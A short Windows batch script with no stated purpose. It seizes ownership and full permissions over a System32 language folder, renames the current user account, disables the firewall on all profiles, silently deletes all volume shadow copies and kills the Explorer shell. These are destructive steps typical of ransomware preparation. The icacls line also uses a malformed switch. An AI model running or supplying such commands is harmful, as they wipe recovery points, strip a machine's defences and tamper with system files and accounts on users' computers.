@echo on
takeown /f "C:\Windows\System32\en-US" /r /d y
icacls "C:\Windows\System32\en-US" /granted %username%:F /T /C
wmic useraccount where name='%username%' set FullName='Username'
wmic useraccount where name='%username%' rename 'Username'
NetSh Advfirewall set allprofiles state off
vssadmin delete shadows /all /Quiet
taskkill /f /im explorer.exe
TIMEOUT 1

